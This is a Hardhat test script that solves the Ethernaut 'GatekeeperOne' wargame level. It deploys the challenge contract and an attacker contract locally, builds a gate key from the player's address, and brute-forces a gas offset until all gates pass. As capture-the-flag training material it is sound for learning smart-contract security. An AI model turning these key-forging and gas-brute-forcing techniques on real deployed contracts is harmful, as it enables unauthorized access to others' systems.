import { ethers } from "hardhat";
import { expect } from "chai";

describe("Ethernaut Level 13 - GatekeeperOne (Forked Sepolia)", function () {
  it("Should pass all gates and set entrant", async function () {
    const [player] = await ethers.getSigners();

    // Deploy GatekeeperOne
    const Gatekeeper = await ethers.getContractFactory("GatekeeperOne");
    const gatekeeper = await Gatekeeper.deploy();
    await gatekeeper.waitForDeployment();
    console.log(`Gatekeeper deployed at: ${gatekeeper.target}`);

    // Deploy Attacker
    const Attacker = await ethers.getContractFactory("GatekeeperOneAttacker");
    const attacker = await Attacker.deploy(gatekeeper.target);
    await attacker.waitForDeployment();
    console.log(`Attacker deployed at: ${attacker.target}`);

    // Construct a valid gateKey
    const origin = player.address;
    const last2BytesHex = origin.slice(-4); // last 2 bytes
    const last2BytesInt = BigInt("0x" + last2BytesHex);
    const paddedKey = BigInt("0x100000000000") + last2BytesInt;
    const gateKey = ethers.hexlify(ethers.zeroPadValue(ethers.toBeHex(paddedKey), 8));

    console.log("gateKey:", gateKey);
    console.log("Brute-forcing gas offset...");

    let success = false;

    for (let i = 0; i < 3000; i++) {
      const gasToUse = 150000 + i;

      try {
        const tx = await attacker.attack(gateKey, gasToUse, {
          gasLimit: gasToUse + 500,
        });
        await tx.wait();

        console.log(`Success with gas: ${gasToUse}`);
        success = true;
        break;
      } catch {
        // Uncomment to see each failed attempt:
        // console.log(`❌ Tried gas: ${gasToUse}`);
      }
    }

    expect(success, "Could not find a valid gas offset").to.be.true;

    const entrant = await gatekeeper.entrant();
    console.log("Entrant is:", entrant);
    expect(entrant).to.equal(player.address);
  });
});
